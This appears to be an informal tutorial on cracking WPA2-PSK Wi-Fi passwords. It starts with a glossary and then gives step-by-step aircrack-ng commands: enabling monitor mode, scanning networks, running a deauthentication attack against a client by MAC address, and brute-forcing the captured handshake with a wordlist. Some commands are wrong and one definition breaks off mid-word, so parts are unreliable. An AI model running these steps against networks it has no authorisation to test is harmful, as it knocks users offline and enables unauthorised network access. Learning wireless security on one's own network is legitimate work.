Wifi Hacking
Key Terms

1) BSSID  --> MAC  address  of  the access point. 
2) SSID --> The Name of Network.
3) CH --> Channel number.
4) WPA2-PSK --> Wifi networks that you connect to by providing a password that's the same for everyone.
5) WPA2-EAP --> Wifi networks that you authenticate to by providing a username and password, which is sent to a RADIUS server.
6) RADIUS --> A server for authenticating clients, not just for wifi.
7) PWR --> Signal level of Wi-Fi Network.
8) Beacons --> Number  of  beacons  sent by the AP. Each access point sends about ten beacons per second at the lowest rate (1M), so they can usually be picked up from very far.
9) Frames -->  The number of data packets sent by the client.
10) Probes --> Probe requests are a type of WiFi management frame. They are not encrypted, since they contain no user data. They are used simply for network discovery.
11) IEEE 802.1X -->  This standard defines how devices authenticate themselves before accessing a network. It’s commonly used in corporate networks where user or device authentication is required. When a device wants to join the network, it must prove its identity first.
12) EAPOL --> EAPOL (Extensible Authentication Protocol over Local Area Network): EAPOL encapsulates EAP packets within Ethernet frames. Initially designed for IEEE 802.3 Ethernet wired networks in 802.1X-2001, it has been adapted for other network types, including IEEE 802.11 wireless (in 802.1X-2004). In wireless networks, EAPOL messages are encapsulated in 802.11 frames.
13) ARP --> ARP stands for Address Resolution Protocol, which is used to find the MAC address of the device from its known IP address. This means, the source device already knows the IP address but not the MAC address of the destination device. The MAC address of the device is required because you cannot commu
14) Interface --> External wifi adapter Name / wireless card name.
15) ENC -->  Type of encryption used commonly used  as WPA2 in this ear and new is WPA3 old is WEP.
16) Station --> Connected device mac address with AP.
17) AUTH --> Authentication tupe opn=open ,PSK=pre-shared key ,SHARED = shared secret (password) .

So, How to Do it Take a WIFI Adapter or Mains Linux

$ lsusb 
	 --> to check for avilable usb device including external adapter
$ iwconfig 
	 --> to check wifi adapter showing or not, named by "wlan0" in kali linux.
# Note if u using any external adapter not showing wlan0 , so maybe it doesn't support linux or driver not installed or avilable. moslty internak wireless card support

# use root terminal u need sudo all time
Step 1: Make Adapter In Monitor Mode 

 Theri are Two Modes :-
 1. Managed Mode  --> it acts as a client device that connects to an Access Point (AP) or a wireless router.
 2. Monitor Mode  --> Simply it can see all on going traffic through the air without connecting to any 
                     network and also receive/send data frames.

 Thier are two ways to do it.

* Way 1 :- Manual way  
 1. Down Your Interface
 $ ifconfig wlan0 down    ------> wlan0 is my Interface

 2. Change Mode To Monitor.
 $ iwconfig wlan0 mode Monitor
 we can verify it using "iwconfig"

 3. Up Your Interface Again
 $ ifconfig wlan0mon down
       or 
 $ ifconfig wlan0 up (if mon not added)

* Way 2 :-  It lot easier and prefer by all it automated by airmon-ng . Just use this command :
   $ airmon-ng start wlan0

# In some case of External adapter you can see you interface name changed to wlan0mon or (mon) word will be add to your interface name.
 and your internal card name is mostly changed that mean you  have made monitor mode enable untill it monitor mode u must give inteface name to be wlan0mon in all process   .
# If it not mon add in you interface it same. 

Step 2: Kill all On going process which may interfere with monitor mode.

$ airodump-ng start wlan0mon  -----> <interface>mon is created here. 

it scan all network with 2.4Ghz freq bez it a default frequency, To scan all 2.4Ghz freq and 5Ghz freq.
use :-

$ airodump-ng start wlan0mon --band abg       ----------> (--band) specifies a band (a --> used as 5Ghz)(b,g --> 2.4GHZ )

Quitting...      


Use Ctrl + C to exit or stop scanning

As You see some Aman and Aman_5G are same bez one is 2.4GHZ and other is 5Ghz. both are same but it depend on clint which band support thier device.

Step 3: Focus on One Network To Analyze The Network Traffic and Capture Hanadshake.

As im monitoring on My own second network.

Step 4: Capture Hanadshake

So for Capturing handshake someone need to connect  to the targeted AP (Access Point) with his device.
if some is trying to connect we succesfully captured the 4-way handshake.

so we need to make connect we use Deauthentication attack to force client to disconnect from current AP and then re Connect to it 
So we get 4-way handshake

to make a deauth attack open new terminal and use following commands:-

$ aireplay-ng wlan0mon -a B4:3D:08:9B:D5:98 -c BC:C7:DA:1F:8A:28 --deauth 10  -----> ( -a is used for  Access point MAC Address, -c is used for Client Device MAC Address ) (-c for a single client address given in station ) (--deauth / -0  to specifies a attack mode  10 number of packet ,0 is for infinite packet )

Step 5: Crack Handshake
As we go to location where er save handshake  
mine is tmp folder

                                                                                                                                         
┌──(root㉿esther)-[~]
└─# cd /tmp ;ls

demo-01.cap            
demo-01.csv            
demo-01.kismet.csv     
demo-01.kismet.netxml  
demo-01.log.csv    

this all are different file formate
but we use .cap file where our handshake have been captured and it wireshark file.


to crack we use

$ aircrack-ng demo-01.cap -w /usr/share/wordlists/rockyou.txt -----> (demo is my file name with .cap extention  and (-w) to give wordlist path )


let start to crack.
